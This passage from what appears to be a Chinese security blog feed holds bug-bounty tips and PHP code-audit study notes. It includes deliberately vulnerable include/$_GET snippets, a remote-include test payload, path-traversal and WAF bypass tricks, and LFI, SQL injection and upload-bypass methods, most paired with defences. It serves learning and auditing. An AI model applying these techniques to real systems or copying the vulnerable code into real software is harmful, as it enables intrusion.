title="Web"></a>Web</h2><ol><li>api接口无法直接访问时（如swagger），把脚本配置文件（如dirsearch）的host改成网站IP。</li><li>注意邮件、短信等携带的链接、短链接内容，可能存在参数可枚举的问题。</li><li>必应、雅虎、搜狗、谷歌、etc，没准就有一个可以搜到奇怪的带权限链接。</li><li>地址接口 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;fonts&#x2F;</span><br><span class="line">&#x2F;pdf&#x2F;</span><br><span class="line">&#x2F;js&#x2F;</span><br><span class="line">&#x2F;css&#x2F;</span><br><span class="line">&#x2F;img&#x2F;</span><br></pre></td></tr></table></figure></li><li>浏览器开插件模拟手机端。</li><li>在线客服处总容易出现奇怪的越权/敏感信息泄漏。</li><li>抓包改发送的邮件内容搞钓鱼（有意思的思路）。</li><li>HTTP请求走私（看来还是该多打CTF）</li><li>ip/a/b 会强制跳转到登录口，但ip/a/c不会，则使用ip/a/c/../b绕过跳转。访问xx.jsp会强制转到访问aa.jsp，访问aa.jsp/../../(../多个)/xx.jsp实现绕过过滤。</li><li>查询参数留空，可能会出现一次性相应所有查询内容的问题。（遇到过几次，和同事讨论过，大概是因为留空自动从where里排除了，导致全量查询。算是平时比较难去想到和测试的点。）</li><li>LDAP 未授权访问 （相比于危害来说，利用未免太过轻松。。。）</li><li>HOST碰撞（利用难度低，危害高，技术较新）</li><li>API接口服务漏洞，关键词wsdl</li><li>分块传输 bypass waf/ waf缓冲区溢出</li></ol><h2 id="IOT"><a href="#IOT" class="headerlink" title="IOT"></a>IOT</h2><ol><li>MQTT协议越权/未授权</li></ol><h1 id="记录一下看到过的burp插件"><a href="#记录一下看到过的burp插件" class="headerlink" title="记录一下看到过的burp插件"></a>记录一下看到过的burp插件</h1><ol><li>JSON Decoder 解码JSON（新burp不是可以直接美化json？）</li><li>MarkINFO (<a href="https://github.com/UUUUnotfound/BurpSuite-Extender-MarkInfo">https://github.com/UUUUnotfound/BurpSuite-Extender-MarkInfo</a>) 高亮敏感信息</li><li>highlighter-and-extractor</li><li>APIKit (<a href="https://github.com/API-Security/APIKit">https://github.com/API-Security/APIKit</a>)</li><li>BurpCrypto</li><li>BurpDomain (<a href="https://github.com/404SEC/BurpDomain">https://github.com/404SEC/BurpDomain</a>)</li><li>turbo</li><li>Logger++</li><li>Bypass WAF</li><li>JSON Web Tokens</li><li>lazyCSRF <a href="https://github.com/tkmru/lazyCSRF/releases/">https://github.com/tkmru/lazyCSRF/releases/</a></li><li>ActiveScan++</li><li>LinkFinder</li></ol><h1 id="记录一下其他脚本工具"><a href="#记录一下其他脚本工具" class="headerlink" title="记录一下其他脚本工具"></a>记录一下其他脚本工具</h1><ol><li>reverse-sourcemap 还原jsmap （可以用curl命令对付不能直接下载的js.map文件）</li><li>wxappUnpacker</li><li>微信小程序加解密脚本：<a href="http://82.156.16.24/index.php/2021/05/26/4.html">http://82.156.16.24/index.php/2021/05/26/4.html</a></li><li>HOST碰撞 <a href="https://github.com/fofapro/Hosts_scan">https://github.com/fofapro/Hosts_scan</a></li><li>fiddler（虽然不是脚本工具但是有看到某个大佬用这个抓包，可能有特别之处）</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;(人菜就要多学习)&lt;/p&gt;
&lt;h1 id=&quot;简单套路&quot;&gt;&lt;a href=&quot;#简单套路&quot; class=&quot;headerlink&quot; title=&quot;简单套路&quot;&gt;&lt;/a&gt;简单套路&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;当请求为&lt;code&gt;数据更新操作（添加、删除、修改等）&lt;/code&gt;，且请求包</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
    
    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
    
    
    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
    
  </entry>
  
  <entry>
    <title>代码审计 企业级web代码安全结构</title>
    <link href="https://tsunamori.github.io/wiki/Notes_%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BC%81%E4%B8%9A%E7%BA%A7web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E7%BB%93%E6%9E%84/"/>
    <id>https://tsunamori.github.io/wiki/Notes_%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BC%81%E4%B8%9A%E7%BA%A7web%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E7%BB%93%E6%9E%84/</id>
    <published>2021-07-17T15:05:28.000Z</published>
    <updated>2021-09-15T08:24:31.170Z</updated>
    
    <content type="html"><![CDATA[<p>苦于代码审计能力偏弱，调研一番发现这本书或许有所帮助。</p><h2 id="第一部分-代码审计前的准备"><a href="#第一部分-代码审计前的准备" class="headerlink" title="第一部分 代码审计前的准备"></a>第一部分 代码审计前的准备</h2><h3 id="代码审计环境搭建"><a href="#代码审计环境搭建" class="headerlink" title="代码审计环境搭建"></a>代码审计环境搭建</h3><ol><li>wamp/wnmp: WAMP（Windows下的Apache+Mysql/MariaDB+Perl/PHP/Python），WNMP（Windows下的Nginx+Mysql+PHP）</li><li>lamp/lnmp：将上述环境安装在Linux中。</li></ol><h4 id="PHP-INI-常量的定义"><a href="#PHP-INI-常量的定义" class="headerlink" title="PHP_INI_*常量的定义"></a>PHP_INI_*常量的定义</h4><ol><li>PHP_INI_USER：该配置选项可在用户的PHP脚本或Win注册表中设置。</li><li>PHP_INI_PERDIR：该配置选项可在php.ini. .htaccess或httpd.conf中设置。</li><li>PHP_INI_SYSTEM：该配置选项可在任何地方设置。</li><li>PHP_INI_ALL：该配置选项可在任何地方设置。</li><li>php.ini only：该配置选项可仅可在php.ini中配置。</li></ol><h4 id="会影响PHP脚本安全的配置列表及核心配置选项"><a href="#会影响PHP脚本安全的配置列表及核心配置选项" class="headerlink" title="会影响PHP脚本安全的配置列表及核心配置选项"></a>会影响PHP脚本安全的配置列表及核心配置选项</h4><ol><li>register_globals(全局变量注册开关)：该选项在on的情况下，会将用户GET/POST等方式提交上来的参数注册成全局变量并初始化值为参数对应的值，使提交参数可以直接在脚本中使用。register_globals在PHP版本小于等于4.2.3时设置为PHP_INI_ALL，从PHP5.3.0起被废弃，在PHP5.4.0中被移除。<br> 代码实例：(实验环境php5.2.17,在php.ini中添加register_globals = On) <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($user&#x3D;&#x3D;&#39;admin&#39;)&#123;</span><br><span class="line">  echo &#39;true&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>allow_url_include(是否允许包含远程文件)：在该配置为on的情况下，可以直接包含远程文件，当存在include(<code>$var</code>)且$var可控的情况下，可以直接控制$var变量来执行PHP代码。allow_url_include在PHP5.2.0后默认设置为off，配置范围为PHP_INI_ALL。与之类似的配置有allow_url_fopen，配置是否允许打开远程文件，但安全隐患没有前者大。<br> 代码实例：(实验环境php5.2.17，payload：a=<a href="http://127.0.0.1/test/info.txt">http://127.0.0.1:80/test/info.txt</a> ，info.txt内容为<code>&lt;?php phpinfo();?&gt;</code>) <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include $_GET[&#39;a&#39;];</span><br></pre></td></tr></table></figure></li><li>magic_quotes_gpc（魔术引号自动过滤）：该参数在不存在编码或其他特殊绕过的情况下，可以使很多漏洞无法利用。当该参数被开启时（选项设置为on），会自动在GET、POST、COOKIE变量中的单引号（‘）、双引号（“）、反斜杠（\）及空字符（NULL）的前面加上反斜杠（\），但在PHP5中magic_quotes_gps并不会过滤$_SERVER变量，导致很多类似client-ip、referer一类的漏洞能够利用。PHP5.3之后不推荐使用该参数，PHP5.4之后被取消。在PHP版本小于4.2.3时，配置范围是PHP_INI_ALL;在PHP版本大于4.2.3时，是PHP_INI_PERDIR。<br> 代码实例：(测试?a=1’) <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $_GET[&#39;a&#39;];</span><br></pre></td></tr></table></figure></li><li>magic_quotes_runtime(魔术引号自动过滤)：过滤方式同样为加反斜杠，但和magic_quotes_gpc的处理对象不一样。magic_quotes_runtime只对从数据库或文件中获取的数据进行过滤，magic_quotes_runtime在PHP5.4之后被取消，配置范围是PHP_INI_ALL。但该参数仅对部分函数有作用，某些情况下可以被绕过。<br> 代码实例： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#1.txt</span><br><span class="line">1&#39;2&quot;3\4</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;magic_quotes_runtime&quot;,&quot;1&quot;);</span><br><span class="line">echo file_get_contents(&quot;1.txt&quot;);</span><br></pre></td></tr></table></figure></li><li>magic_quotes_sybase(魔术引号自动过滤)：用于自动过滤特殊字符，当设置为on时，会覆盖magic_quotes_gpc=on的配置（使gpc=on失效）。与gpc的共同点是处理对象一致（GET、POST、Cookie)，但该参数仅转义空字符以及把单引号变成双引号，使用率比gpc低。配置范围为PHP_INI_ALL，在PHP5.4.0中移除。（代码实例与gpc相同）</li><li>safe_mode（安全模式）：是PHP内嵌的一种安全机制，配置范围为PHP_INI_SYSTEM，PHP5.4之后被取消（取消原因是，PHP开发者认为在PHP语言机制上试图解决安全问题是一件不合适的事情，虽然safe_mode在一定程度上对共享主机有效，但同时也带来了不少误报，与其在PHP上解决权限安全问题，不如使用linux默认的权限限制机制或其它层级的解决办法）。该参数效果为，所有文件操作函数都会受到限制，非文件所有者不能对该文件进行操作（如include()），如果有一些脚本文件放在非Web服务启动用户所有的目录下，需要利用include等函数进行加载，可以使用safe_mode_include_dir来配置可包含的路径。此外，通过函数popen()、system()以及exec()等函数执行命令或程序会提示错误，如果需要使用外部脚本，可以集中存放，然后用safe_node_exec_dir来指向存放目录。<br> 代码实例： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># echo &#96;whoami&#96;; 执行命令失败的回显提示</span><br><span class="line">Warning: shell_exec() [function, shell_exec]: Cannot execute using backquotes in Safe Mode ...</span><br></pre></td></tr></table></figure></li><li>open_basedir（PHP可访问目录）：用于限制PHP只能访问哪些目录，通常只需要设置Web文件目录即可，如果需要加载外部脚本，也需要把所在路径加入该指令中，多个目录以分号分割。需要注意，指定限制实际上是前缀而不是目录名，如配置open_basedir=/www/a，那么/www/a和/www/ab都可以访问，所以为了避免该现象发生，需要用斜线结束路径名，如/www/a/。当参数激活，执行脚本访问其它文件时都需要验证文件路径，所以会影响执行效率。该指令配置范围在PHP&lt;5.2.3时是PHP_INI_SYSTEM，在PHP&gt;=5.2.3时是PHP_INI_ALL。</li><li>disable_functions(禁用函数)：使用该指令来禁止敏感函数的使用，使用本指令时，需把dl()函数也添加进禁用列表，否则攻击者可以利用dl()函数价值自定义的PHP扩展突破该指令的限制。指令范围为php.ini，配置禁用函数时使用逗号分割函数名。</li><li>display_errors和error_reporting错误显示：display_errors用于表明是否显示PHP脚本内部错误，生产环境中建议关闭，在开启时，可以通过设置error_reporting来设置错误显示的级别。配置范围均为PHP_INI_ALL。</li></ol><h3 id="审计辅助与漏洞验证工具"><a href="#审计辅助与漏洞验证工具" class="headerlink" title="审计辅助与漏洞验证工具"></a>审计辅助与漏洞验证工具</h3><h4 id="代码编辑器"><a href="#代码编辑器" class="headerlink" title="代码编辑器"></a>代码编辑器</h4><ol><li>Notepad++</li><li>UltraEdit（文件对比）</li><li>Zend Studio（PHP集成开发环境）</li></ol><h4 id="代码审计工具"><a href="#代码审计工具" class="headerlink" title="代码审计工具"></a>代码审计工具</h4><ol><li>Seay源代码审计系统</li><li>RIPS</li></ol><h4 id="漏洞验证辅助"><a href="#漏洞验证辅助" class="headerlink" title="漏洞验证辅助"></a>漏洞验证辅助</h4><ol><li>Burp</li><li>浏览器扩展：Hackbar, Firebug, Live HTTP Headers, Modify</li><li>编码转换及加解密工具：Seay代码审计系统自带的编码功能，Burp自带的decoder，超级加解密转换工具</li><li>正则调试工具：Seay自带的正则调试功能，灵者正则调试</li><li>SQL执行监控工具：Seay mysql监控</li></ol><h2 id="漏洞发现与防范"><a href="#漏洞发现与防范" class="headerlink" title="漏洞发现与防范"></a>漏洞发现与防范</h2><h3 id="通用代码审计思路"><a href="#通用代码审计思路" class="headerlink" title="通用代码审计思路"></a>通用代码审计思路</h3><h4 id="敏感函数回溯参数过程"><a href="#敏感函数回溯参数过程" class="headerlink" title="敏感函数回溯参数过程"></a>敏感函数回溯参数过程</h4><p>根据敏感函数来逆向追踪参数的传递过程，使用较多，因为大多数漏洞都是由于函数使用不当造成的。非函数使用不当的漏洞，如SQL注入，也有一些特征，如Select、Incert等，结合From和Where等关键字判断是否为一条SQL语句，通过对字符串的识别分析，就能判断该SQL语句参数有没有使用单引号过滤，或者根据经验判断。如HTTP头里面的HTTP_CLIENT_IP和HTTP_X_FORWORDFOR等获取到的IP地址常直接拼接到SQL语句中，且由于它们是存在于<code>$_SERVER</code>变量中不受GPC的影响，那么就可以查找这两个参数关键字快速寻找漏洞。<br>该方法的优点是定向挖掘、高效、高质量，缺点是对整体框架了解不够深入，定位利用点会花费时间，另外无法覆盖逻辑漏洞。</p><h4 id="通读全文代码"><a href="#通读全文代码" class="headerlink" title="通读全文代码"></a>通读全文代码</h4><p>在企业中做自身产品代码审计时，我们需要了解整个应用的业务逻辑以获取更多漏洞。<br>通读全文代码时，首先要看程序的大体代码结构，如主目录有哪些文件，模块目录有哪些文件，插件目录有哪些文件，还要注意文件大小、创建时间。根据文件命名可大致了解该程序实现哪些功能，核心文件是哪些。<br>在看程序目录结构时，要特别注意以下几个文件：</p><ol><li><code>函数集文件</code>，通常命名中包含functions或者common等关键字，这些文件内是一些公共函数，提供给其它文件统一调用，所以大多数文件会在文件头包含其它文件。寻找这些文件的一个技巧就是打开index.php或一些功能性文件，在头部一般都能找到。</li><li><code>配置文件</code>，通常命名中包含config关键字，包括Web程序运行必须的功能性配置选项及数据库等配置信息，从该文件中可以了解程序的小部分功能，另外看这个文件时注意观察配置文件中参数值是用单引号还是双引号，如果是双引号，则很可能存在代码执行漏洞。（如利用PHP可变变量（$$a）的特性执行代码，ref：<a href="https://www.cnblogs.com/Cl0ud/p/12336834.html%EF%BC%89">https://www.cnblogs.com/Cl0ud/p/12336834.html）</a></li><li><code>安全过滤文件</code>，该文件关系到挖掘到的可疑点能否利用，通常命名中有filter、safe、check等关键字。这类文件主要作用是针对参数进行过滤，比较常见的是针对SQL注入和XSS过滤，还有文件路径、执行的系统命令的参数，其它相对少见。而目前大多数应用会在程序入口循环对所有参数使用addslashes()进行过滤。</li><li><code>index文件</code>，是一个程序的入口文件，通过阅读该文件可大致了解整个程序的架构、运行流程、包含的文件，以及核心文件有哪些。而不同的目录的index文件也有不同的实现方式，最好先将核心目录的index文件都简单读一遍。<br>学习代码审计前期建议先下载一些小应用来读，积累经验后，再去读开源框架。</li></ol><h4 id="根据功能点定向审计"><a href="#根据功能点定向审计" class="headerlink" title="根据功能点定向审计"></a>根据功能点定向审计</h4><p>先简单黑盒测试一下，再通过发现的容易出问题的功能去阅读该功能点的源码，提高审计速度。</p><ol><li>文件上传功能：任意上传、SQL注入</li><li>文件管理功能：任意文件操作、XSS漏洞</li><li>登录认证功能：任意用户登录</li><li>找回密码功能：验证码爆破、验证凭证算法</li></ol><h3 id="漏洞挖掘与防范（基础篇）"><a href="#漏洞挖掘与防范（基础篇）" class="headerlink" title="漏洞挖掘与防范（基础篇）"></a>漏洞挖掘与防范（基础篇）</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><h5 id="挖掘经验"><a href="#挖掘经验" class="headerlink" title="挖掘经验"></a>挖掘经验</h5><p>常出现在登录页面、获取HTTP头（user-agent/client-ip等）、订单处理等业务相对复杂的地方，登录页面注入大多出现在HTTP头的client-ip和x-forward-for，用于记录登录IP地址。另外在订单系统内，由于订单涉及购物车等多个交互，经常会发生二次注入，通读代码时可着重关注这几个地方。</p><ol><li>普通注入：指最容易利用的SQL注入漏洞，有int型和string型，在string型注入中需要使用单或双引号闭合。数据库操作存在一些关键字，如select from、mysql_connect、mysql_query、mysql_fetch_row等，查询方式还有update、incert、delete，只需要在白盒审计中查找这些关键字即可定向挖掘SQL注入。</li><li>编码注入：程序在进行一些操作前经常会进行编码处理，而做编码处理的函数可能会存在问题。通过输入转码函数不兼容的特殊字符，即可导致输出字符变成有害数据，在SQL注入里，最常见的编码注入是MySQL宽字节以及urldecode/rawurldecode函数导致的。<ul><li>宽字节注入：使用PHP连接MySQL的时候，当设置<code>set character_set_client=gbk</code>时会导致一个编码转换的注入问题，当存在该漏洞时，注入参数里带入<code>%df%27</code>，即可把程序中过滤的<code>\(%5c)</code>吃掉。而通常都不是直接设置<code>set character_set_client=gbk</code>，而是设置<code>SET NAMES ‘gbk’</code>，同样存在漏洞。官方建议是使用mysql_set_charset来设置编码，只要在后面合理的使用mysql_real_escape_string还是可以解决该漏洞的。对宽字节注入的挖掘方法比较简单，搜索<code>SET NAMES</code>、<code>character_set_client=gbk</code>、<code>mysql_set_charset(&#39;gbk&#39;)</code>。该漏洞的解决方法如以下三种，比较推荐一和三：<ul><li>在执行查询前先执行<code>SET NAMES &#39;gbk&#39;, character_set_client=binary</code></li><li>使用mysql_set_charset(‘gbk’)设置编码，然后使用mysql_real_escape_string()过滤。</li><li>使用pdo方式，在PHP5.3.6及以下版本中需要设置<code>setAttribute(PDO::ATTR_EMULATE_PREPARES,false);</code>，来禁用prepared statements的仿真效果。</li></ul></li><li>二次urlencode注入：只要字符被进行转换就有可能产生漏洞。现在的Web程序大多会进行参数过滤，通常使用addslashes()、mysql_real_escape_string()、mysql_escape_string()函数或者开启GPC的方式来防止注入，也就是给单引号、双引号、反斜杠（\）和NULL加上反斜杠转义。如果某处使用了urldecode或者rawurldecode函数，则会导致二次加码生成单引号而引发注入。该漏洞可以通过搜索urldecode和rawurldecode函数来挖掘。</li></ul></li></ol><h5 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h5><ol><li>gpc/runtime魔术引号：通常数据污染有两种方式，一种是应用被动接收参数，另一种是主动获取参数。利用magic_quotes_gpc和magic_quotes_runtime可以防止部分SQL注入（对int型注入没有太大作用）</li><li>过滤函数和类：有两种使用场景，一种是程序入口统一过滤，框架程序使用这种方式比较多，另一种是在程序进行SQL语句运行前使用，除了PHP内置的一些过滤单引号等函数外，还有一些开源类过滤union、select等关键字。<ul><li>addslashes函数：过滤单引号、双引号、反斜杠以及空字符NULL，大多被用在程序入口，判断如果没有开启GPC则使用该函数进行过滤。不过它的参数必须是string类，所以可能会存在通过数组绕过的漏洞。</li><li>mysql_[real_]escape_string函数：这两个函数都是对字符串进行过滤，只存在于大于PHP4.03的版本，[<code>\x00</code>]、[<code>\n</code>]、[<code>\r</code>]、[<code>\</code>]、[<code>&#39;</code>]、[<code>&quot;</code>]、[<code>\xla</code>]会受到影响。两个函数唯一不一样的地方在于mysql_real_escape_string接受的是一个连接句柄并根据当前字符集转移字符串，推荐使用。</li><li>intval等字符转换：上述方式在int类型注入时效果不会，比如可以通过报错或盲注等方式来绕过，这时候就要用到intval函数了。intval的作用是将变量转换成int类型，这里举例intval是要表达一种利用参数类型白名单的方式来防止漏洞，对应的还有很多如floatval等。</li></ul></li><li>PDO prepare预编译：通过预编译的方式来处理数据库查询。当PHP版本&lt;5.3.6时，使用PHP本地模拟prepare再把完整的SQL语句发送给MySQL服务器，且使用set names ‘gbk’时，仍然存在宽字节SQL注入，因为PHP和MySQL编码不一致。正确的写法应该是使用ATTR_EMULATE_PREPARES来禁用PHP本地模拟prepare。</li></ol><h4 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h4><h5 id="挖掘经验-1"><a href="#挖掘经验-1" class="headerlink" title="挖掘经验"></a>挖掘经验</h5><p>挖掘XSS漏洞关键在于寻找没有被过滤的参数，且这些参数传入至输出函数。常用输出函数列表如下：<code>print、print_r、echo、printf、sprintf、die、var_dump、var_export</code>，寻找带有变量的这些函数即可。另外在代码审计中，浏览器环境对XSS漏洞利用影响非常大。通读代码时可多关注各处设置资料、文章发表、留言等富文本区域，这种地方存在的XSS通常是存储型的。</p><h5 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h5><p>直接通过外部输入在浏览器端输出触发，该种漏洞比较容易通过扫描器黑盒审计发现。白盒审计中，只需要寻找带有参数的输出参数，根据输出参数对输出内容回溯输入参数，观察有没有经过过滤。</p><h5 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h5><p>把利用代码保存在数据库或文件中，当Web程序读取利用代码并输出在页面上时执行利用代码。比反射型容易利用，较为隐蔽且不用考虑绕过浏览器过滤。挖掘时也是需要寻找未过滤的输入点和未过滤的输出函数（可能完全不在同一个业务流中），可以根据当前代码功能去猜，或追寻数据有在哪里被操作，使用表名、字段名去代码里搜索。</p><h5 id="漏洞防范-1"><a href="#漏洞防范-1" class="headerlink" title="漏洞防范"></a>漏洞防范</h5><ol><li>特殊字符HTML实体转码。</li><li>标签事件属性黑白名单。</li></ol><h4 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h4><h5 id="挖掘经验-2"><a href="#挖掘经验-2" class="headerlink" title="挖掘经验"></a>挖掘经验</h5><p>主要用于越权操作，所以漏洞会出现在有权限控制的地方。黑盒挖洞可以先搭建环境，打开几个有非静态操作的页面，抓包看看有没有token，没有token就不带referer直接请求该页面，返回数据一样的话，可能存在CSRF漏洞。白盒审计，通读代码时看看被大量引用的基础文件（核心文件）、你比较关心的功能点代码内有没有验证token和referer相关的代码，或者直接搜索token关键字。</p><h5 id="漏洞防范-2"><a href="#漏洞防范-2" class="headerlink" title="漏洞防范"></a>漏洞防范</h5><ol><li>增加token/referer验证避免img标签请求的水坑攻击。</li><li>增加验证码。（比较麻烦，更适用于敏感操作页面）</li></ol><h3 id="漏洞挖掘与防范（进阶篇）"><a href="#漏洞挖掘与防范（进阶篇）" class="headerlink" title="漏洞挖掘与防范（进阶篇）"></a>漏洞挖掘与防范（进阶篇）</h3><h4 id="文件操作漏洞"><a href="#文件操作漏洞" class="headerlink" title="文件操作漏洞"></a>文件操作漏洞</h4><h5 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h5><p>文件包涵函数有include()、include_once()（前两个在包含文件时即使遇到错误，下面的代码仍然执行）、require()、require_once()（这两个在包含文件时遇到错误会报错退出程序）。</p><h6 id="挖掘经验-3"><a href="#挖掘经验-3" class="headerlink" title="挖掘经验"></a>挖掘经验</h6><p>文件包含漏洞大多出现在模块加载、模板加载以及cache调用的地方。在挖掘漏洞时可以跟踪程序运行流程，看模块加载包含的文件是否可控等，另一个是直接搜索上文四个函数来回溯寻找可控变量。一般该类漏洞都是本地文件包含，大多需要截断。</p><h6 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h6><p>本地文件包含（local file include，LFI），大多出现在模块加载、模板加载和cache调用，有多种利用方式，如上传一个允许上传的文件格式的文件再包含以执行代码，包含PHP上传的临时文件，在请求URL或ua里面加入要执行的代码，WebServer记录到日志后再包含WebServer的日志，还有像Linux下可以包含/proc/self/environ文件。</p><h6 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h6><p>远程文件包含（remote file include, RFI），需要设置allow_url_include = On，相比于本地包含来说更容易利用，但出现频率不高。</p><h6 id="文件包含截断"><a href="#文件包含截断" class="headerlink" title="文件包含截断"></a>文件包含截断</h6><ol><li>使用<code>%00</code>截断，最古老的方法，受限于GPC和addslashes等函数的过滤，另外PHP5.3之后的版本已经全面修复，不能使用该方法了。</li><li>使用多个英文句号<code>.</code>和反斜杠<code>/</code>来阶段，不受GPC限制，但同样在PHP5.3之后被修复。</li><li>远程文件包含时利用问号<code>？</code>来伪截断，不受GPC和PHP版本限制，只要能返回代码给包含函数就能执行。在HTTP协议里，访问<a href="http://remotehost/i.txt%E5%92%8C%E8%AE%BF%E9%97%AEhttp://remotehost/i.txt?.php">http://remotehost/i.txt和访问http://remotehost/i.txt?.php</a> 返回的结果是一样的，因为WebServer把问号之后的内容当成请求参数，而txt不在WebServer里解析，参数对访问i.txt返回的内容不影响，实现伪截断。</li></ol><h5 id="文件读取（下载）漏洞"><a href="#文件读取（下载）漏洞" class="headerlink" title="文件读取（下载）漏洞"></a>文件读取（下载）漏洞</h5><h6 id="挖掘经验-4"><a href="#挖掘经验-4" class="headerlink" title="挖掘经验"></a>挖掘经验</h6><p>文件读取漏洞比较容易寻找，一种方式是可以先黑盒看功能点对应的文件，再去读文件源码。另一种是搜索文件读取的函数（<code>file_get_contents()、highlight_file()、fopen()、readfile()、fread()、fgetss()、fgets()、parse_ini_file()、show_source()、file()</code>），看有无可直接或间接控制的变量，除了正常读取文件的函数之外，另外一些其他功能的函数也可以用于读取文件，如include()等。</p><h5 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h5><h6 id="挖掘经验-5"><a href="#挖掘经验-5" class="headerlink" title="挖掘经验"></a>挖掘经验</h6><p>挖掘简单，上传点常调用同一个上传类，上传函数又只有move_uploaded_file()这一个，所以最快方法就是直接搜索该函数，再去看调用的代码存不存在未限制上传格式或者可以绕过，其中问题较多的是黑名单限制文件格式以及未更改文件名的方式，在未改名的情况下，在Apache利用其向前寻找解析格式和IIS6的分号解析bug都可以执行代码。</p><ol><li>未过滤或本地过滤：共同点是都未在服务器端过滤。</li><li>黑名单扩展名过滤：出现较少，存在限制的扩展名不够全、验证扩展名的方式存在问题可直接绕过或截断。</li><li>文件头、content-type验证绕过：早期出现较多，上传文件时，如果直接上传一个非图片文件会被提示不是图片文件，但只要在文件头里加上<code>GIF89a</code>后上传，则验证通过。这是因为程序用了如getimagesize()函数等。content-type是在http request请求头内，所以可以被攻击者修改，而早期的一些程序只是单纯的验证了这个值。</li></ol><h5 id="文件删除漏洞"><a href="#文件删除漏洞" class="headerlink" title="文件删除漏洞"></a>文件删除漏洞</h5><p>常出现在有文件管理功能的应用上，原理和文件读取差不多，只不过利用的函数不一样，一般因为删除的文件名可以用<code>../</code>跳转，或者没有限制当前用户权限。</p><h6 id="挖掘经验-6"><a href="#挖掘经验-6" class="headerlink" title="挖掘经验"></a>挖掘经验</h6><p>。挖掘漏洞可以先去找相应的功能点，黑盒测试一下能不能删除某个文件，如果删除不了，再去从执行流程追踪提交的文件名参数的传递过程。如果纯白盒挖，也可以去搜索带有变量参数的unlink()，采取回溯变量的方式。</p><h5 id="文件操作漏洞防范"><a href="#文件操作漏洞防范" class="headerlink" title="文件操作漏洞防范"></a>文件操作漏洞防范</h5><h6 id="通用文件操作防御"><a href="#通用文件操作防御" class="headerlink" title="通用文件操作防御"></a>通用文件操作防御</h6><ol><li>合理的权限管理。</li><li>以加密等方式替代直接将文件名作为下载参数的操作。</li><li>避免目录跳转，禁止参数中携带<code>..</code>、<code>/</code>、<code>\</code>来跳转目录。</li></ol><h6 id="文件上传漏洞防范"><a href="#文件上传漏洞防范" class="headerlink" title="文件上传漏洞防范"></a>文件上传漏洞防范</h6><ol><li>白名单过滤文件扩展名，使用in_array或<code>===</code>来对比扩展名。</li><li>保存上传文件时重命名文件，文件名采用时间戳的拼接随机数的MD5值保存方式<code>md5(time()+rand(1,10000))</code></li></ol><h4 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h4><h5 id="挖掘经验-7"><a href="#挖掘经验-7" class="headerlink" title="挖掘经验"></a>挖掘经验</h5><p>eval()和assert()函数导致的代码执行漏洞大多是因为载入缓存或者模板以及对变量的处理不严格导致。<br>preg_replace()函数代码执行需要存在/e参数，这个函数原本是用来处理字符串的，因此漏洞出现最多的是在对字符串的处理，比如URL、HTML标签以及文章内容等过滤功能。<br>call_user_func()和call_user_func_array()函数的功能是调用函数，多用在框架里面动态调用函数，所以一般比较小的程序不常出现该类代码执行。array_map()函数的作用是调用函数并且除第一个参数外其它参数为数组，通常会写死第一个参数，即调用的参数，类似这三个函数功能的函数还有很多。<br>还有一类非常常见的是动态函数的代码执行，如<code>$_GET($_POST[&quot;xx&quot;])</code>。</p><h5 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h5><ol><li>eval和assert函数：用于动态执行函数，所以它们的参数就是PHP代码。</li><li>preg_replace函数：对字符串进行正则处理。</li><li>调用函数过滤不严：数十个函数有调用其它函数的功能，如果传入的函数名可控，那么就可以调用意外的函数来执行需要的代码，即存在代码执行漏洞。这些函数有：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 